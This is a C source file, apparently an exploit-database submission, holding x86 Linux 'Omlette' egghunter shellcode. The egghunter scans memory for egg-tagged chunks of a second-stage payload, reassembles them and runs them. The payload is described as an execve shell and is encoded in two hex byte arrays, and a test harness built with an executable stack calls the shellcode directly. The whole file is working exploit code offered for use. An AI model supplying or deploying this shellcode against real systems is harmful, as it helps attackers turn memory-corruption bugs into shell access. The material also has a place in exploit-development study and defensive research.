/* Title: Omlette Egghunter shellcode ( 102 bytes)
 * Author: pktmonky
 * Description: Omlette Egghunter shellcode to search memory for second stage
 * shellcode chunks.
 * The egg and the second stage shellcode chunks are configurable.
 * Compile with: gcc -O3 -ftemp -fno-stack-protector -z execstack omlette.c -o omlette
 */

#include<stdio.h>
#include<string.h>

/* Each EGG is configurable, avoid using NULL bytes or any other discovered forbidden characters.
 * The first byte of each egg is calculated as (number_of_eggs + 2) - current_egg.
 * The configured shellcode is an execve shell. Any shellcode that avoids NULL bytes and
 * discovered forbidden characters is allowed.
 * Each shellcode chunk must be the same size, use NOP bytes within the first chunk to align chunks.
 */
#define EGG1 "\x04\x30\x30\x77"
#define EGG2 "\x03\x30\x30\x77"

/* Number of second stage chunks */
#define EGGNUM "\x03"

/* Size of second stage chunks (negative value) */
#define CHUNKSIZE "\xa0\xff"

/* Offset within stack to write assembled second stage shellcode.
 * Current offset is set to CHUNKSIZE * EGGNUM + 0x300
 */
#define OFFSET "\x60\x03"

unsigned char shell1[] = 
EGG1
EGG1
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\xda\xce\xbd\xa9\xe0\x5a\x14\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x22\x83\xc0\x04\x31\x68\x13\x03\xc1\xf3\xb8\xe1\xac\xe9\x82\xa2"
"\x4d\xcb\x3d\x6b\x25\xc8\x35\xd7\xee\xd9\x07\xf3\xc1\xb2\x74\x87"
"\xca\xb9\x78\xec\x1e\x1e\x22\xa8\xff\x86\x65\xe6\xf2\x4d\x8a\xd7";

unsigned char shell2[] = 
EGG2
EGG2
"\xc5\xba\x71\xf5\x0d\xfa\x96\x8d\xb4\x5d\x49\x49\x4e\x05\x88\x03"
"\x39\xee\xcc\xf3\x4c\x4d\xf2\x76\x68\x95\xcd\xb7\x0e\x65\xfd\x10"
"\x20\x21\x10\x83\x4e\xb4\xbf\x64\xe4\x68\x41\xa4\x9a\x76\x57\x28"
"\x86\xbc\xf6\xfd\xb1\xd0\xac\x5d\xc9\x2a\x78\x8b\x70\x14\xe6\xb9"
"\x31\x16\xf1\xf1\x7c\x46\xcd\x91\x81\xc2\xaf\x7e\x18\x7f\x60\x6e"
"\x49\x56\xd1\xd0\xed\x1a\x8a\x26\xe0\x60\x02\x69\xc0\x81\x8a\xe1"; 
 
unsigned char egghunter[] =
"\xeb\x1c\x54\x5f\x66\x81\xc7"OFFSET"\x6a\x02\x58\x31\xf6\x66\xbe"
CHUNKSIZE"\x4f\x46\x66\x83\xfe\xff\x75\xf8\x48\x75\xef\xc3\xe8\xdf"
"\xff\xff\xff\x31\xd2\x6a"EGGNUM"\x59\x57\x66\x81\xca\xff\x0f\x42"
"\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x01\x30\x30"
"\x77\x01\xc8\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\x5f\x89\xd6\x83\xc6"
"\x08\x51\x6a\x60\x59\xf3\xa4\x59\x49\x80\xf9\x01\x57\x75\xd0\x5e"
"\xe8\x9e\xff\xff\xff\xff\xe7";

main()
{

    printf("Shellcode Length:  %d\n", strlen(egghunter));
 
    int (*ret)() = (int(*)())egghunter;
 
    ret();
 
}
